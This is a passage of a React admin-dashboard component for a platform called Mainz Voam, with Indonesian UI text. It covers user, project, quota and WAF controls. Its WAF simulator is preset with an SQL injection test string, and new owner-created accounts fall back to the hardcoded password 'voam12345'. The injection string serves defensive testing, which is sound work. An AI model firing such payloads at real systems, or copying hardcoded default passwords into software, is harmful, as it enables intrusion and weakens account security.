"use client";

import React, { useState, useEffect, useCallback, useMemo } from "react";
import { useRouter } from "next/navigation";
import {
  Shield,
  Users,
  FolderGit2,
  Sliders,
  FileTerminal,
  Activity,
  Lock,
  Unlock,
  Ban,
  CheckCircle2,
  Trash2,
  ExternalLink,
  Code2,
  Plus,
  RefreshCw,
  Download,
  AlertTriangle,
  Terminal,
  Search,
  LogOut,
  ArrowLeft,
  Megaphone,
  Database,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  UserPlus,
} from "lucide-react";
import AnimatedLogo from "@/components/animations/AnimatedLogo";
import { withAuthGuard } from "@/components/auth/withAuthGuard";
import { useVoam } from "@/context/VoamContext";
import {
  listAllUsersForOwner,
  listAllProjectsForOwner,
  updateUserByOwner,
  deleteUserAndProjectsByOwner,
  setProjectStatusByOwner,
  deleteProjectDocument,
} from "@/lib/firebase";
import {
  OWNER_DISPLAY_EMAIL,
  clearSecurityLogs,
  getSecurityLogs,
  inspectInputWithWaf,
  isOwnerEmail,
} from "@/lib/security-shield";
import type {
  VoamProject,
  VoamSecurityLog,
  VoamUserDocument,
} from "@/types/voam";

type OwnerTabId =
  | "overview"
  | "users"
  | "projects"
  | "waf"
  | "quotas"
  | "logs";

function OwnerCommandCenterContent() {
  const router = useRouter();
  const {
    user,
    isOwner,
    systemConfig,
    updateSystemConfig,
    provisionUserByOwner,
    logoutUser,
    setIslandStatus,
  } = useVoam();

  const [activeTab, setActiveTab] = useState<OwnerTabId>("overview");
  const [allUsers, setAllUsers] = useState<VoamUserDocument[]>([]);
  const [allProjects, setAllProjects] = useState<VoamProject[]>([]);
  const [securityLogs, setSecurityLogs] = useState<VoamSecurityLog[]>([]);
  const [loadingData, setLoadingData] = useState<boolean>(true);

  // State Pencarian & Filter
  const [userSearch, setUserSearch] = useState<string>("");
  const [projectSearch, setProjectSearch] = useState<string>("");
  const [logFilter, setLogFilter] = useState<string>("all");

  // State Provisioning User Baru oleh Owner
  const [newUserEmail, setNewUserEmail] = useState<string>("");
  const [newUserPassword, setNewUserPassword] = useState<string>("");
  const [newUserName, setNewUserName] = useState<string>("");
  const [newUserQuota, setNewUserQuota] = useState<number>(
    systemConfig.maxProjectsPerUser
  );

  // State Blacklist Domain Email
  const [newBlockedDomain, setNewBlockedDomain] = useState<string>("");

  // State Simulator Serangan WAF
  const [wafTestInput, setWafTestInput] = useState<string>(
    "admin@domain.com' OR 1=1 --"
  );
  const [wafTestResult, setWafTestResult] = useState<{
    tested: boolean;
    safe: boolean;
    message: string;
    threatType?: string;
  } | null>(null);

  // State Form Kuota & Pengumuman
  const [quotaMaxUsers, setQuotaMaxUsers] = useState<number>(
    systemConfig.maxTotalUsersInDb
  );
  const [quotaMaxProjectsPerUser, setQuotaMaxProjectsPerUser] =
    useState<number>(systemConfig.maxProjectsPerUser);
  const [quotaMaxFilesPerProject, setQuotaMaxFilesPerProject] =
    useState<number>(systemConfig.maxFilesPerProject);
  const [quotaMaxSizeKb, setQuotaMaxSizeKb] = useState<number>(
    systemConfig.maxProjectSizeKb
  );
  const [rateMaxRegWindow, setRateMaxRegWindow] = useState<number>(
    systemConfig.maxRegistrationsPerWindow
  );
  const [rateCooldownSec, setRateCooldownSec] = useState<number>(
    systemConfig.registrationCooldownSeconds
  );
  const [announcementDraft, setAnnouncementDraft] = useState<string>(
    systemConfig.globalAnnouncement
  );

  useEffect(() => {
    setQuotaMaxUsers(systemConfig.maxTotalUsersInDb);
    setQuotaMaxProjectsPerUser(systemConfig.maxProjectsPerUser);
    setQuotaMaxFilesPerProject(systemConfig.maxFilesPerProject);
    setQuotaMaxSizeKb(systemConfig.maxProjectSizeKb);
    setRateMaxRegWindow(systemConfig.maxRegistrationsPerWindow);
    setRateCooldownSec(systemConfig.registrationCooldownSeconds);
    setAnnouncementDraft(systemConfig.globalAnnouncement);
  }, [systemConfig]);

  const loadAllTelemetry = useCallback(async () => {
    setLoadingData(true);
    try {
      const [usersList, projectsList] = await Promise.all([
        listAllUsersForOwner(),
        listAllProjectsForOwner(),
      ]);
      setAllUsers(usersList);
      setAllProjects(projectsList);
      setSecurityLogs(getSecurityLogs());
    } finally {
      setLoadingData(false);
    }
  }, []);

  useEffect(() => {
    if (isOwner) {
      loadAllTelemetry();
    }
  }, [isOwner, loadAllTelemetry]);

  // Statistik Telemetri Database
  const telemetry = useMemo(() => {
    let totalFiles = 0;
    let totalBytes = 0;
    allProjects.forEach((p) => {
      const entries = Object.entries(p.fileSystem || {});
      totalFiles += entries.length || p.fileCount || 0;
      entries.forEach(([pathKey, content]) => {
        totalBytes += pathKey.length + (content || "").length;
      });
    });

    const totalKb = Math.max(1, Math.round(totalBytes / 1024));
    const userUsagePercent = Math.min(
      100,
      Math.round(
        (allUsers.length / Math.max(1, systemConfig.maxTotalUsersInDb)) * 100
      )
    );
    const suspendedCount = allUsers.filter(
      (u) => u.status === "suspended"
    ).length;
    const quarantinedProjects = allProjects.filter(
      (p) => p.status === "quarantined"
    ).length;
    const blockedAttacksCount = securityLogs.filter(
      (l) =>
        l.type !== "OWNER_CONFIG_UPDATED" && l.type !== "USER_STATUS_CHANGED"
    ).length;

    return {
      totalFiles,
      totalKb,
      userUsagePercent,
      suspendedCount,
      quarantinedProjects,
      blockedAttacksCount,
    };
  }, [allUsers, allProjects, securityLogs, systemConfig.maxTotalUsersInDb]);

  // Proteksi halaman jika bukan Owner
  if (!isOwner) {
    return (
      <div className="min-h-screen bg-[#050507] text-zinc-100 flex items-center justify-center p-6">
        <div className="voam-glass rounded-2xl p-8 max-w-md w-full text-center space-y-4 border-rose-500/30">
          <div className="w-12 h-12 rounded-2xl bg-rose-500/15 border border-rose-500/30 flex items-center justify-center mx-auto text-rose-400">
            <ShieldAlert className="w-6 h-6" />
          </div>
          <h1 className="text-lg font-semibold text-white">
            Akses Otoritas Ditolak (403)
          </h1>
          <p className="text-xs text-zinc-400 leading-relaxed">
            Halaman{" "}
            <strong className="text-zinc-200">Owner Command Center</strong>{" "}
            hanya dapat diakses oleh akun Supreme Owner (
            <code className="text-zinc-200 font-mono">
              {OWNER_DISPLAY_EMAIL}
            </code>
            ).
          </p>
          <button
            type="button"
            onClick={() => router.replace("/dashboard")}
            className="voam-btn-primary w-full"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Kembali ke Dashboard Developer</span>
          </button>
        </div>
      </div>
    );
  }

  // Handler Toggle Konfigurasi Cepat
  const handleToggleConfigFlag = async (
    key:
      | "registrationEnabled"
      | "deploymentsEnabled"
      | "maintenanceMode"
      | "sqlInjectionShield"
      | "noSqlInjectionShield"
      | "xssSanitizerShield"
      | "requireHumanChallengeOnRegister",
    label: string
  ) => {
    const nextValue = !systemConfig[key];
    await updateSystemConfig({ [key]: nextValue });
    setSecurityLogs(getSecurityLogs());
    setIslandStatus(
      "deployed",
      `${label}: ${nextValue ? "AKTIF" : "NONAKTIF"}`,
      {
        subtitle: "Kebijakan global disimpan ke system_settings/global",
        autoResetMs: 2600,
      }
    );
  };

  // Handler Provision User Baru oleh Owner
  const handleCreateUserByOwner = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const cleanEmail = newUserEmail.trim().toLowerCase();
      if (!cleanEmail || !cleanEmail.includes("@")) return;
      const pass = newUserPassword.trim() || "voam12345";

      await provisionUserByOwner({
        email: cleanEmail,
        password: pass,
        displayName:
          newUserName.trim() || cleanEmail.split("@")[0] || "Developer",
        customMaxProjects:
          Number(newUserQuota) || systemConfig.maxProjectsPerUser,
      });

      setNewUserEmail("");
      setNewUserPassword("");
      setNewUserName("");
      await loadAllTelemetry();
      setIslandStatus("deployed", `Akun ${cleanEmail} Berhasil Dibuat`, {
        subtitle: `Kata sandi aktif • Kuota ${newUserQuota} proyek`,
        autoResetMs: 3200,
      });
    } catch (err) {
      setIslandStatus("error", "Gagal Membuat Akun", {
        errorMessage:
          err instanceof Error ? err.message : "Gagal provisioning akun.",
        autoResetMs: 4000,
      });
    }
  };

  // Handler Suspend / Unsuspend User
  const handleToggleSuspendUser = async (target: VoamUserDocument) => {
    if (isOwnerEmail(target.email)) return;
    const nextStatus = target.status === "suspended" ? "active" : "suspended";
    await updateUserByOwner(target.uid, { status: nextStatus });
    await loadAllTelemetry();
    setIslandStatus(
      nextStatus === "suspended" ? "error" : "deployed",
      nextStatus === "suspended"
        ? `Akun ${target.email} Ditangguhkan`
        : `Akun ${target.email} Diaktifkan Kembali`,
      { autoResetMs: 2600 }
    );
  };

  // Handler Ubah Kuota Proyek Kustom per User
  const handleUpdateUserQuota = async (
    target: VoamUserDocument,
    nextQuota: number
  ) => {
    const safeQuota = Math.max(1, Math.min(500, Number(nextQuota) || 1));
    await updateUserByOwner(target.uid, { customMaxProjects: safeQuota });
    await loadAllTelemetry();
    setIslandStatus(
      "deployed",
      `Kuota ${target.displayName}: ${safeQuota} Proyek`,
      { autoResetMs: 2400 }
    );
  };

  // Handler Hapus User & Seluruh Proyeknya
  const handleDeleteUser = async (target: VoamUserDocument) => {
    if (isOwnerEmail(target.email)) return;
    await deleteUserAndProjectsByOwner(target.uid);
    await loadAllTelemetry();
    setIslandStatus("deployed", `Akun & Proyek ${target.email} Dihapus`, {
      autoResetMs: 2800,
    });
  };

  // Handler Karantina / Pulihkan Proyek
  const handleToggleProjectQuarantine = async (proj: VoamProject) => {
    const nextStatus =
      proj.status === "quarantined" ? "deployed" : "quarantined";
    await setProjectStatusByOwner(proj.id, nextStatus);
    await loadAllTelemetry();
    setIslandStatus(
      nextStatus === "quarantined" ? "error" : "deployed",
      nextStatus === "quarantined"
        ? `Proyek ${proj.name} Dikarantina`
        : `Proyek ${proj.name} Dipulihkan`,
      { autoResetMs: 2600 }
    );
  };

  // Handler Hapus Proyek oleh Owner
  const handleDeleteProjectByOwner = async (proj: VoamProject) => {
    await deleteProjectDocument(proj.id);
    await loadAllTelemetry();
    setIslandStatus("deployed", `Proyek ${proj.name} Dihapus`, {
      autoResetMs: 2500,
    });
  };

  // Handler Tambah / Hapus Blacklist Domain Email
  const handleAddBlockedDomain = async (e: React.FormEvent) => {
    e.preventDefault();
    const clean = newBlockedDomain
      .trim()
      .toLowerCase()
      .replace(/^@/, "");
    if (!clean || !clean.includes(".")) return;
    if (systemConfig.blockedEmailDomains.includes(clean)) {
      setNewBlockedDomain("");
      return;
    }
    const updatedDomains = [...systemConfig.blockedEmailDomains, clean];
    await updateSystemConfig({ blockedEmailDomains: updatedDomains });
    setNewBlockedDomain("");
    setSecurityLogs(getSecurityLogs());
    setIslandStatus("deployed", `Domain @${clean} Diblokir`, {
      autoResetMs: 2400,
    });
  };

  const handleRemoveBlockedDomain = async (domain: string) => {
    const updatedDomains = systemConfig.blockedEmailDomains.filter(
      (d) => d !== domain
    );
    await updateSystemConfig({ blockedEmailDomains: updatedDomains });
    setSecurityLogs(getSecurityLogs());
  };

  // Handler Simulator Serangan WAF
  const handleRunWafSimulation = (payloadToTest?: string) => {
    const targetPayload =
      payloadToTest !== undefined ? payloadToTest : wafTestInput;
    if (payloadToTest !== undefined) {
      setWafTestInput(payloadToTest);
    }

    const res = inspectInputWithWaf(
      targetPayload,
      "WAF Penetration Simulator",
      user?.email || OWNER_DISPLAY_EMAIL,
      { config: systemConfig }
    );
    setSecurityLogs(getSecurityLogs());

    if (!res.safe) {
      setWafTestResult({
        tested: true,
        safe: false,
        message:
          res.reason || "Payload berbahaya berhasil diblokir oleh WAF.",
        threatType: res.threatType,
      });
      setIslandStatus("error", "WAF Memblokir Payload Uji!", {
        errorMessage: res.reason,
        autoResetMs: 4000,
      });
    } else {
      setWafTestResult({
        tested: true,
        safe: true,
        message:
          "Input aman: Tidak ditemukan tanda-tanda SQL Injection, NoSQL Operator Injection, maupun XSS.",
      });
      setIslandStatus("deployed", "WAF: Input Dinyatakan Bersih", {
        autoResetMs: 2500,
      });
    }
  };

  // Handler Simpan Kuota & Pengumuman
  const handleSaveQuotasAndBroadcast = async (e: React.FormEvent) => {
    e.preventDefault();
    await updateSystemConfig({
      maxTotalUsersInDb: Math.max(5, Number(quotaMaxUsers) || 500),
      maxProjectsPerUser: Math.max(1, Number(quotaMaxProjectsPerUser) || 10),
      maxFilesPerProject: Math.max(3, Number(quotaMaxFilesPerProject) || 150),
      maxProjectSizeKb: Math.max(50, Number(quotaMaxSizeKb) || 850),
      maxRegistrationsPerWindow: Math.max(1, Number(rateMaxRegWindow) || 3),
      registrationCooldownSeconds: Math.max(0, Number(rateCooldownSec) || 20),
      globalAnnouncement: announcementDraft.trim(),
    });
    setSecurityLogs(getSecurityLogs());
    setIslandStatus("deployed", "Kuota DB & Broadcast Diperbarui", {
      subtitle: "Tersinkronisasi ke Firestore system_settings",
      autoResetMs: 2800,
    });
  };

  // Handler Ekspor Snapshot Database JSON
  const handleExportDatabaseJson = () => {
    const snapshot = {
      exportedAt: new Date().toISOString(),
      exportedBy: OWNER_DISPLAY_EMAIL,
      systemConfig,
      telemetry,
      users: allUsers,
      projects: allProjects,
      securityLogs,
    };
    const blob = new Blob([JSON.stringify(snapshot, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `mainz-voam-db-snapshot-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    setIslandStatus("deployed", "Snapshot Database Diekspor", {
      subtitle: "Berkas JSON cadangan berhasil diunduh",
      autoResetMs: 2600,
    });
  };

  const filteredUsers = allUsers.filter(
    (u) =>
      u.email.toLowerCase().includes(userSearch.toLowerCase()) ||
      u.displayName.toLowerCase().includes(userSearch.toLowerCase()) ||
      u.uid.toLowerCase().includes(userSearch.toLowerCase())
  );

  const filteredProjects = allProjects.filter(
    (p) =>
      p.name.toLowerCase().includes(projectSearch.toLowerCase()) ||
      p.ownerEmail.toLowerCase().includes(projectSearch.toLowerCase()) ||
      p.deploymentId.toLowerCase().includes(projectSearch.toLowerCase())
  );

  const filteredLogs = securityLogs.filter((l) =>
    logFilter === "all" ? true : l.type === logFilter
  );

  return (
    <div className="min-h-screen bg-[#050507] text-zinc-100 flex flex-col">
      {/* Top Sticky Header Supreme Owner */}
      <header className="sticky top-0 z-30 h-14 border-b border-white/[0.08] bg-[#050507]/90 backdrop-blur-xl px-4 sm:px-8 flex items-center justify-between">
        <div className="flex items-center gap-3 min-w-0">
          <AnimatedLogo size="sm" />
          <span className="text-zinc-700 select-none">/</span>
          <div className="flex items-center gap-2 min-w-0">
            <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-mono font-semibold bg-amber-500/15 text-amber-300 border border-amber-500/30">
              <Shield className="w-3 h-3 text-amber-400" />
              SUPREME OWNER
            </span>
            <span className="hidden md:inline-block text-xs font-mono text-zinc-300 truncate">
              {OWNER_DISPLAY_EMAIL}
            </span>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            type="button"
            onClick={() => router.push("/dashboard")}
            className="voam-btn-secondary"
          >
            <Code2 className="w-3.5 h-3.5 text-zinc-300" />
            <span className="hidden sm:inline">Workspace Studio</span>
          </button>

          <button
            type="button"
            onClick={loadAllTelemetry}
            title="Segarkan Data Database"
            className="voam-btn-secondary px-2.5"
          >
            <RefreshCw
              className={`w-3.5 h-3.5 ${loadingData ? "animate-spin" : ""}`}
            />
          </button>

          <button
            type="button"
            onClick={async () => {
              await logoutUser();
              router.replace("/");
            }}
            className="voam-btn-secondary hover:border-rose-500/40 hover:text-rose-300"
          >
            <LogOut className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Keluar</span>
          </button>
        </div>
      </header>

      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-8 py-7 space-y-6">
        {/* Hero Bar Owner Command Center */}
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 border-b border-white/[0.07] pb-6">
          <div>
            <div className="flex items-center gap-2 text-xs font-mono text-amber-300 mb-1">
              <Sparkles className="w-3.5 h-3.5" />
              <span>
                OTORITAS TERTINGGI • MAINZ VOAM SECURITY &amp; GOVERNANCE
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-semibold text-white tracking-tight">
              Supreme Owner Command Center
            </h1>
            <p className="text-xs sm:text-sm text-zinc-400 mt-1">
              Kendalikan seluruh akun pengguna, kuota database anti-limit,
              perisai WAF Anti-SQLi/NoSQLi, serta inspeksi seluruh proyek secara
              real-time.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              onClick={handleExportDatabaseJson}
              className="voam-btn-secondary"
            >
              <Download className="w-3.5 h-3.5 text-zinc-300" />
              <span>Backup DB (.JSON)</span>
            </button>
            <button
              type="button"
              onClick={() => setActiveTab("waf")}
              className="voam-btn-primary"
            >
              <ShieldCheck className="w-4 h-4" />
              <span>Uji Simulator WAF</span>
            </button>
          </div>
        </div>

        {/* Navigasi 6 Tab Komando */}
        <div className="flex items-center gap-1.5 overflow-x-auto pb-1 border-b border-white/[0.06]">
          {(
            [
              {
                id: "overview",
                label: "Ikhtisar & Sakelar Darurat",
                icon: Activity,
              },
              {
                id: "users",
                label: `Manajemen Akun (${allUsers.length})`,
                icon: Users,
              },
              {
                id: "projects",
                label: `Inspektor Proyek (${allProjects.length})`,
                icon: FolderGit2,
              },
              {
                id: "waf",
                label: "Perisai WAF & Anti-SQLi",
                icon: Shield,
              },
              {
                id: "quotas",
                label: "Limitasi DB & Broadcast",
                icon: Sliders,
              },
              {
                id: "logs",
                label: `Log Forensik (${securityLogs.length})`,
                icon: FileTerminal,
              },
            ] as const
          ).map((tab) => {
            const Icon = tab.icon;
            const active = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                type="button"
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-3.5 py-2 rounded-xl text-xs font-medium whitespace-nowrap transition-all ${
                  active
                    ? "bg-white text-[#050507] font-semibold shadow-sm"
                    : "text-zinc-400 hover:text-zinc-200 hover:bg-white/[0.04]"
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>

        {/* ================= TAB 1: OVERVIEW & EMERGENCY KILL-SWITCHES ================= */}
        {activeTab === "overview" && (
          <div className="space-y-6">
            {/* 4 Kartu Metrik Utama */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="voam-glass rounded-2xl p-5 space-y-3">
                <div className="flex items-center justify-between text-xs text-zinc-400">
                  <span>Kapasitas Akun Database</span>
                  <Users className="w-4 h-4 text-zinc-300" />
                </div>
                <div className="flex items-baseline justify-between">
                  <span className="text-2xl font-semibold text-white font-mono">
                    {allUsers.length}{" "}
                    <span className="text-xs text-zinc-500">
                      / {systemConfig.maxTotalUsersInDb}
                    </span>
                  </span>
                  <span className="text-xs font-mono text-emerald-400">
                    {telemetry.userUsagePercent}% terpakai
                  </span>
                </div>
                <div className="w-full h-1.5 rounded-full bg-white/[0.06] overflow-hidden">
                  <div
                    className="h-full bg-emerald-400 transition-all duration-300"
                    style={{ width: `${telemetry.userUsagePercent}%` }}
                  />
                </div>
                <p className="text-[11px] text-zinc-500">
                  {telemetry.suspendedCount} akun ditangguhkan (suspended)
                </p>
              </div>

              <div className="voam-glass rounded-2xl p-5 space-y-3">
                <div className="flex items-center justify-between text-xs text-zinc-400">
                  <span>Total Proyek &amp; Berkas</span>
                  <Database className="w-4 h-4 text-zinc-300" />
                </div>
                <div className="flex items-baseline justify-between">
                  <span className="text-2xl font-semibold text-white font-mono">
                    {allProjects.length}
                  </span>
                  <span className="text-xs font-mono text-sky-400">
                    {telemetry.totalFiles} file ({telemetry.totalKb} KB)
                  </span>
                </div>
                <p className="text-[11px] text-zinc-500">
                  {telemetry.quarantinedProjects} proyek dalam status karantina
                </p>
              </div>

              <div className="voam-glass rounded-2xl p-5 space-y-3">
                <div className="flex items-center justify-between text-xs text-zinc-400">
                  <span>Serangan Diblokir WAF</span>
                  <ShieldAlert className="w-4 h-4 text-rose-400" />
                </div>
                <div className="flex items-baseline justify-between">
                  <span className="text-2xl font-semibold text-white font-mono">
                    {telemetry.blockedAttacksCount}
                  </span>
                  <span className="text-xs font-mono text-rose-300">
                    SQLi / NoSQLi / Spam
                  </span>
                </div>
                <p className="text-[11px] text-zinc-500">
                  Tercatat otomatis di Log Audit Forensik
                </p>
              </div>

              <div className="voam-glass rounded-2xl p-5 space-y-3">
                <div className="flex items-center justify-between text-xs text-zinc-400">
                  <span>Status Perisai Inti</span>
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                </div>
                <div className="flex flex-wrap gap-1.5 pt-1">
                  <span
                    className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                      systemConfig.sqlInjectionShield
                        ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                        : "bg-rose-500/15 text-rose-300"
                    }`}
                  >
                    SQLi: {systemConfig.sqlInjectionShield ? "ON" : "OFF"}
                  </span>
                  <span
                    className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                      systemConfig.noSqlInjectionShield
                        ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                        : "bg-rose-500/15 text-rose-300"
                    }`}
                  >
                    NoSQLi: {systemConfig.noSqlInjectionShield ? "ON" : "OFF"}
                  </span>
                  <span
                    className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                      systemConfig.xssSanitizerShield
                        ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                        : "bg-rose-500/15 text-rose-300"
                    }`}
                  >
                    XSS: {systemConfig.xssSanitizerShield ? "ON" : "OFF"}
                  </span>
                </div>
                <p className="text-[11px] text-zinc-500">
                  Maks {systemConfig.maxRegistrationsPerWindow} akun baru / 15 mnt
                </p>
              </div>
            </div>

            {/* Sakelar Darurat (Emergency Kill-Switches) */}
            <div className="voam-glass rounded-2xl p-6 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-sm font-semibold text-white">
                    Sakelar Kontrol Global &amp; Darurat (Kill-Switches)
                  </h2>
                  <p className="text-xs text-zinc-400 mt-0.5">
                    Ubah kebijakan operasional seluruh platform secara instan
                    untuk menghentikan serangan spam atau menjaga kuota DB.
                  </p>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-1">
                {/* Switch 1: Pendaftaran Akun Publik */}
                <div className="p-4 rounded-xl bg-[#060609] border border-white/[0.08] flex flex-col justify-between gap-4">
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-semibold text-white">
                        Registrasi Akun Publik
                      </span>
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                          systemConfig.registrationEnabled
                            ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                            : "bg-amber-500/15 text-amber-300 border border-amber-500/30"
                        }`}
                      >
                        {systemConfig.registrationEnabled
                          ? "DIBUKA"
                          : "DIKUNCI"}
                      </span>
                    </div>
                    <p className="text-xs text-zinc-400 leading-relaxed">
                      Matikan untuk memblokir total pembuatan akun baru dari
                      publik saat terjadi serangan bot spam massal.
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() =>
                      handleToggleConfigFlag(
                        "registrationEnabled",
                        "Registrasi Publik"
                      )
                    }
                    className={
                      systemConfig.registrationEnabled
                        ? "voam-btn-secondary w-full justify-center"
                        : "voam-btn-primary w-full justify-center"
                    }
                  >
                    {systemConfig.registrationEnabled ? (
                      <>
                        <Lock className="w-3.5 h-3.5 text-amber-400" />
                        <span>Kunci Registrasi Sekarang</span>
                      </>
                    ) : (
                      <>
                        <Unlock className="w-3.5 h-3.5" />
                        <span>Buka Kembali Registrasi</span>
                      </>
                    )}
                  </button>
                </div>

                {/* Switch 2: Pipeline Deployment Global */}
                <div className="p-4 rounded-xl bg-[#060609] border border-white/[0.08] flex flex-col justify-between gap-4">
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-semibold text-white">
                        Pipeline Deployment Vercel
                      </span>
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                          systemConfig.deploymentsEnabled
                            ? "bg-emerald-500/15 text-emerald-300 border border-emerald-500/30"
                            : "bg-rose-500/15 text-rose-300 border border-rose-500/30"
                        }`}
                      >
                        {systemConfig.deploymentsEnabled
                          ? "AKTIF"
                          : "DIBEKUKAN"}
                      </span>
                    </div>
                    <p className="text-xs text-zinc-400 leading-relaxed">
                      Bekukan seluruh penulisan proyek baru dan re-deploy dari
                      pengguna reguler untuk melindungi kuota tulis Firestore.
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() =>
                      handleToggleConfigFlag(
                        "deploymentsEnabled",
                        "Pipeline Deployment"
                      )
                    }
                    className={
                      systemConfig.deploymentsEnabled
                        ? "voam-btn-secondary w-full justify-center"
                        : "voam-btn-primary w-full justify-center"
                    }
                  >
                    {systemConfig.deploymentsEnabled ? (
                      <>
                        <Ban className="w-3.5 h-3.5 text-rose-400" />
                        <span>Bekukan Deployment User</span>
                      </>
                    ) : (
                      <>
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        <span>Aktifkan Deployment User</span>
                      </>
                    )}
                  </button>
                </div>

                {/* Switch 3: Mode Lockdown / Pemeliharaan */}
                <div className="p-4 rounded-xl bg-[#060609] border border-white/[0.08] flex flex-col justify-between gap-4">
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-semibold text-white">
                        Mode Lockdown (Maintenance)
                      </span>
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-mono ${
                          systemConfig.maintenanceMode
                            ? "bg-rose-500/15 text-rose-300 border border-rose-500/30"
                            : "bg-zinc-500/15 text-zinc-300 border border-white/[0.08]"
                        }`}
                      >
                        {systemConfig.maintenanceMode ? "LOCKDOWN" : "NORMAL"}
                      </span>
                    </div>
                    <p className="text-xs text-zinc-400 leading-relaxed">
                      Saat aktif, hanya Supreme Owner (
                      <code className="text-zinc-200 font-mono">
                        {OWNER_DISPLAY_EMAIL}
                      </code>
                      ) yang dapat masuk dan mengakses sistem.
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() =>
                      handleToggleConfigFlag(
                        "maintenanceMode",
                        "Mode Lockdown Maintenance"
                      )
                    }
                    className={
                      systemConfig.maintenanceMode
                        ? "voam-btn-primary w-full justify-center"
                        : "voam-btn-secondary w-full justify-center"
                    }
                  >
                    {systemConfig.maintenanceMode ? (
                      <>
                        <Unlock className="w-3.5 h-3.5" />
                        <span>Matikan Mode Lockdown</span>
                      </>
                    ) : (
                      <>
                        <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
                        <span>Aktifkan Mode Lockdown</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ================= TAB 2: MANAJEMEN PENGGUNA & OTORITAS ================= */}
        {activeTab === "users" && (
          <div className="space-y-6">
            {/* Form Provisioning Akun Baru oleh Owner */}
            <form
              onSubmit={handleCreateUserByOwner}
              className="voam-glass rounded-2xl p-5 space-y-4"
            >
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-sm font-semibold text-white flex items-center gap-2">
                    <UserPlus className="w-4 h-4 text-zinc-200" />
                    Provisioning Akun Developer Baru (Otoritas Owner)
                  </h2>
                  <p className="text-xs text-zinc-400 mt-0.5">
                    Buat akun pengguna secara langsung beserta kata sandi dan
                    kuota proyek khususnya.
                  </p>
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-5 gap-3">
                <input
                  type="email"
                  required
                  value={newUserEmail}
                  onChange={(e) => setNewUserEmail(e.target.value)}
                  placeholder="Email akun baru..."
                  className="voam-input text-xs font-mono"
                />
                <input
                  type="text"
                  required
                  minLength={6}
                  value={newUserPassword}
                  onChange={(e) => setNewUserPassword(e.target.value)}
                  placeholder="Password (min 6)..."
                  className="voam-input text-xs font-mono"
                />
                <input
                  type="text"
                  value={newUserName}
                  onChange={(e) => setNewUserName(e.target.value)}
                  placeholder="Nama tampilan..."
                  className="voam-input text-xs"
                />
                <input
                  type="number"
                  min={1}
                  max={500}
                  value={newUserQuota}
                  onChange={(e) => setNewUserQuota(Number(e.target.value))}
                  placeholder="Kuota Proyek"
                  className="voam-input text-xs font-mono"
                />
                <button type="submit" className="voam-btn-primary text-xs">
                  <Plus className="w-4 h-4" />
                  <span>Buat Akun</span>
                </button>
              </div>
            </form>

            {/* Daftar Pengguna & Kontrol Rinci */}
            <div className="voam-glass rounded-2xl overflow-hidden">
              <div className="p-4 sm:px-6 border-b border-white/[0.07] flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <h3 className="text-sm font-semibold text-white">
                    Daftar Seluruh Akun di Database ({filteredUsers.length})
                  </h3>
                  <p className="text-xs text-zinc-400">
                    Atur kuota maksimum proyek per akun, bekukan akun (suspend),
                    atau hapus akun spammer beserta proyeknya.
                  </p>
                </div>
                <div className="relative w-full sm:w-64">
                  <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={userSearch}
                    onChange={(e) => setUserSearch(e.target.value)}
                    placeholder="Cari email, nama, UID..."
                    className="voam-input pl-9 py-1.5 text-xs font-mono"
                  />
                </div>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-white/[0.06] text-[11px] font-mono text-zinc-400 bg-white/[0.01]">
                      <th className="py-3 px-4">PENGGUNA &amp; EMAIL</th>
                      <th className="py-3 px-4">PERAN &amp; STATUS</th>
                      <th className="py-3 px-4">PEMAKAIAN PROYEK</th>
                      <th className="py-3 px-4">KUOTA KUSTOM</th>
                      <th className="py-3 px-4 text-right">TINDAKAN OWNER</th>
                    </tr>
                  </thead>
